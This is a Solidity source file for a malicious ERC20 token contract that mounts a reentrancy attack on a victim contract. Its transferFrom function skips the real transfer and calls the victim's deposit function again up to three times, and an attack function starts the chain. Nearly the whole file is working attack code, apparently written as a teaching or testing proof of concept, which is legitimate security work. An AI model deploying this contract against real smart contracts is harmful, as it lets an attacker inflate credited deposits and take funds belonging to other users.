pragma solidity ^0.6.0;

interface IVictim
{
    function deposit(uint256 amount) external;
}

interface IErc20
{
    function totalSupply() external view returns (uint);
    function balanceOf(address tokenOwner) external view returns (uint balance);
    function allowance(address tokenOwner, address spender) external view returns (uint remaining);
    function transfer(address to, uint tokens) external returns (bool success);
    function approve(address spender, uint tokens) external returns (bool success);
    function transferFrom(address from, address to, uint tokens) external returns (bool success);
    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract ReentrancyAttackerToken is IErc20
{
    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
    
    uint public callCounter;
    IVictim public victim;
    
    function totalSupply() override external view returns (uint) {}
    function balanceOf(address tokenOwner) override external view returns (uint balance) {}
    function allowance(address tokenOwner, address spender) override external view returns (uint remaining) {}
    function transfer(address to, uint tokens) override external returns (bool success) {}
    function approve(address spender, uint tokens) override external returns (bool success) {}
    
    function transferFrom(address from, address to, uint tokens) override external returns (bool success)
    {
        // A regular ERC20 token should just do the transfer. Instead we perform reentrancy attack by
        // calling the victim's deposit function recursively, 3 times again.
        callCounter++;
        if (callCounter <= 3)
        {
            victim.deposit(20);
        }
        return true;
    }

    function configureVictimToUse (address contractAddressOfVictim) public
    {
        victim = IVictim(contractAddressOfVictim);
    }
    
    function attack() public 
    {
        callCounter = 0;
        victim.deposit(10);
    }
}